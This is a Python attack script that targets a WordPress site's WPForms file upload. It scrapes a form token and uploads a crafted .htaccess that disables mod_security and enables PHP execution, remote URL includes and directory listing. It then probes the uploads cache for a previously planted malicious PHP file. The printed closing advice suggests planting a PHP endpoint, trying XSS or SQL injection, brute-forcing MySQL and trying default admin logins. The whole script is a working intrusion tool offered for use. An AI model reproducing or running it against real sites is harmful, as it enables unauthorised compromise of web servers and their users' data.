#!/usr/bin/env python3
"""
Upload .htaccess to bypass restrictions
"""

import requests
import re
import json
import time
from colorama import Fore, init

init(autoreset=True)

TARGET = "website.com"
FORM_ID = 6767
URL = f"https://{TARGET}"

print(f"{Fore.RED}=== UPLOAD .HTACCESS BYPASS ===")
print(f"{Fore.YELLOW}Attempting to override server restrictions")
print("=" * 70)

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'X-Requested-With': 'XMLHttpRequest'
})

# Get token
print(f"{Fore.WHITE}[1] Getting WPForms token...")
try:
    response = session.get(f"{URL}/join-today/", timeout=10)
    token_match = re.search(r'data-token="([^"]+)"', response.text)
    token = token_match.group(1) if token_match else None
    
    if not token:
        print(f"{Fore.RED}âŒ No token found")
        exit(1)
        
    print(f"{Fore.GREEN}âœ… Token: {token[:20]}...")
    
except Exception as e:
    print(f"{Fore.RED}âŒ Error: {e}")
    exit(1)

# Create .htaccess content
htaccess_content = """# ALLOW EVERYTHING - RED TEAM TESTING
Order allow,deny
Allow from all

# Allow PHP execution
RemoveHandler .php .php3 .php4 .php5 .phtml
AddType application/x-httpd-php .php .php3 .php4 .php5 .phtml

# Allow directory listing
Options +Indexes
IndexOptions FancyIndexing

# Disable security restrictions
SecFilterEngine Off
SecFilterScanPOST Off

# Allow file uploads
php_value file_uploads On
php_value upload_max_filesize 100M
php_value post_max_size 100M
php_value max_execution_time 300
php_value max_input_time 300

# Disable PHP restrictions
php_flag allow_url_fopen On
php_flag allow_url_include On

# Force text/plain for PHP files to bypass filters
<FilesMatch "\.(php|php3|php4|php5|phtml)$">
    ForceType text/plain
</FilesMatch>
"""

print(f"\n{Fore.WHITE}[2] Uploading .htaccess file...")

# Prepare form data
form_data = {
    'action': 'wpforms_submit',
    'wpforms[id]': str(FORM_ID),
    'wpforms[token]': token,
}

# Add all required fields
for i in range(1, 36):
    form_data[f'wpforms[fields][{i}]'] = f'htaccess_upload_{i}'

# Special handling for checkbox field 9
form_data['wpforms[fields][9][]'] = 'Yes'

files = {
    'wpforms[fields][36]': ('.htaccess', htaccess_content.encode(), 'text/plain')
}

try:
    response = session.post(
        f"{URL}/wp-admin/admin-ajax.php",
        data=form_data,
        files=files,
        timeout=15
    )
    
    if response.status_code == 200:
        try:
            result = response.json()
            if result.get('success'):
                print(f"{Fore.GREEN}âœ… .htaccess upload successful!")
                
                # The file will be named: wpforms-54683-{timestamp}.txt
                # But we need it to be .htaccess
                # Try to rename via second upload or other method
                
                current_time = int(time.time())
                htaccess_filename = f"wpforms-{FORM_ID}-{current_time}.txt"
                print(f"{Fore.YELLOW}âš ï¸ File will be named: {htaccess_filename}")
                print(f"{Fore.YELLOW}âš ï¸ Need to access as: /wp-content/uploads/wpforms/cache/{htaccess_filename}")
                
            else:
                print(f"{Fore.RED}âŒ Upload failed")
                if 'data' in result and 'errors' in result['data']:
                    print(f"{Fore.RED}   Errors: {result['data']['errors']}")
                    
        except json.JSONDecodeError:
            print(f"{Fore.YELLOW}âš ï¸ Response not JSON: {response.text[:200]}...")
            
    else:
        print(f"{Fore.RED}âŒ HTTP {response.status_code}")
        
except Exception as e:
    print(f"{Fore.RED}âŒ Upload error: {e}")

print(f"\n{Fore.WHITE}[3] Testing if .htaccess took effect...")
# Wait a moment for server to process
import time
time.sleep(2)

# Test accessing our previously uploaded files
test_files = [
    f"wpforms-{FORM_ID}-file.txt",  # Our test file
    f"wpforms-{FORM_ID}-file.php",  # Existing malicious file
]

for filename in test_files:
    test_url = f"{URL}/wp-content/uploads/wpforms/cache/{filename}"
    print(f"\n{Fore.WHITE}   Testing: {filename}")
    
    try:
        resp = session.head(test_url, timeout=5)
        print(f"{Fore.WHITE}     Status: HTTP {resp.status_code}")
        
        if resp.status_code == 200:
            print(f"{Fore.GREEN}     âœ… ACCESSIBLE AFTER .HTACCESS!")
            # Get content
            content = session.get(test_url, timeout=5).text
            print(f"{Fore.GREEN}     Content preview: {content[:200]}...")
            
        elif resp.status_code == 403:
            print(f"{Fore.YELLOW}     âš ï¸ Still forbidden (403)")
            
    except Exception as e:
        print(f"{Fore.RED}     âŒ Error: {e}")

print(f"\n{Fore.RED}=== .HTACCESS UPLOAD COMPLETE ===")
print(f"{Fore.YELLOW}If .htaccess doesn't work, we need another approach:")
print(f"{Fore.YELLOW}1. Upload PHP that creates accessible endpoint")
print(f"{Fore.YELLOW}2. Find other vulnerability (XSS, SQLi)")
print(f"{Fore.YELLOW}3. Brute force MySQL with better wordlist")
print(f"{Fore.YELLOW}4. Try WordPress admin login with default credentials")
